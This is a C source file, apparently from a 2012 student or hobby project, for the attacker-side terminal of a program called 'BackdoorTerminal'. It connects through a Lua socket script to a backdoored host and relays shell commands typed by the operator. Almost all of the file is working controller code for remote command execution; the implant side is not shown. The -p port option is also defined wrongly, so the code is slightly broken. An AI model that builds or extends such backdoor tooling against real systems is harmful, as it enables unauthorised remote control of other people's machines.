/*******************************************************************************
 * SOURCE FILE: attacker.c
 *
 * PROGRAM: BackdoorTerminal
 *
 * FUNCTIONS:
 *
 * DATE: October 2, 2012
 *
 * DESIGNER: Karl Castillo (c)
 *
 * PROGRAMMER: Karl Castillo (c)
 *
 * NOTES:
 *
 * Lua Installation (Ubuntu):
 *	sudo apt-get install lua5.1
 *	sudo apt-get install lua5.1-socket2
 *	sudo apt-get install lua5.1-0-dev
 *
 * Lua Installation (Fedora): 
 *
 * Compile:
 *	gcc -Wall -o terminal attacker.c -I/path/to/Lua/includes -llua5.1 -lm 
 ******************************************************************************/

/** LUA REQUIRED INCLUDES **/
#include <lua.h>
#include <lauxlib.h>
#include <lualib.h>

/** C INCLUDES **/
#include <stdio.h>
#include <stdlib.h>	
#include <string.h>
#include <unistd.h>

/** DEFINES **/
#define DEF_PORT	8000
#define DEF_HOST	"127.0.0.1"
#define DEF_IPSZ	80
#define	DEF_BUFF	255

/** PROTOTYPES **/
void startTerminal(int port, char host[80]);
void prompt(lua_State *L);
void lfatal(lua_State *L, char *msg);

int main(int argc, char **argv)
{
	int option = 0;
	int port = DEF_PORT;
	char host[80] = DEF_HOST;
	
	while((option = getopt(argc, argv, ":H:p")) != -1) {
		switch(option) {
		case 'H': /* Host */
			strncpy(host, optarg, 79);
			break;
		case 'p': /* port */
			port = atoi(optarg);
			break;
		default:
			fprintf(stderr, "Invalid switch: -%c\n", option);
			break;
		}
	}
	
	printf("================================\n");
	printf("-- Backdoor - Attacker Side   --\n");
	printf("-- Karl Castillo (c)	      --\n");
	printf("-- James Brennan (c)          --\n");
	printf("================================\n\n");
	
	startTerminal(port, host);
	
	return 0;
}

void startTerminal(int port, char host[80])
{
	lua_State *L = lua_open();
	
	/* Open Lua Library */
	luaL_openlibs(L);
	
	/* Choose the lua file that will run */
	if(luaL_loadfile(L, "sock.lua")) {
		lfatal(L, "luaL_loadfile() failed");
	}
	
	/* Start lua file */
	if(lua_pcall(L, 0, 0, 0)) {
		lfatal(L, "lua_pcall()");
	}
	
	/* Get connect function */
	lua_getglobal(L, "connect");
	
	if(!lua_isfunction(L, -1)) {
		lua_pop(L, 1);
		lfatal(L, "lua_isfunction() failed");
	}
	
	/* Setup arguments */
	lua_pushstring(L, host);
	lua_pushnumber(L, port);

	/* Call the lua function */
	if(lua_pcall(L, 2, 2, 0)) {
		lfatal(L, "lua_pcall() failed");
	}
	
	/* Print out results */
	//printf("%s", lua_tostring(L, 2));
	//printf("%s", lua_tostring(L, 2));
	
	prompt(L);
	
	lua_getglobal(L, "close");
	
	if(lua_pcall(L, 0, 0, 0)) {
		lfatal(L, "lua_pcall() failed");
	}
	
	lua_close(L);
}

void prompt(lua_State *L)
{
	char cmd[DEF_BUFF];
	
	printf("$ ");
	
	while(fgets(cmd, DEF_BUFF - 1, stdin) != NULL) {
		if(strncmp(cmd, "quit", 4) == 0) {
			printf("Quitting...\n");
			return;
		} else {
			lua_getglobal(L, "sendCommand");
			
			if(!lua_isfunction(L, -1)) {
				lua_pop(L, 1);
				lfatal(L, "lua_isfunction() failed");
			};
		
			lua_pushstring(L, cmd);
			
			if(lua_pcall(L, 1, 1, 0)) {
				lfatal(L, "lua_pcall() failed");
			}
		}
		printf("$ ");	
	}
}

void lfatal(lua_State *L, char *msg)
{
	fprintf(stderr, "\nFatal Error:\n %s: %s\n\n", msg, lua_tostring(L, -1));
	exit(1);
}
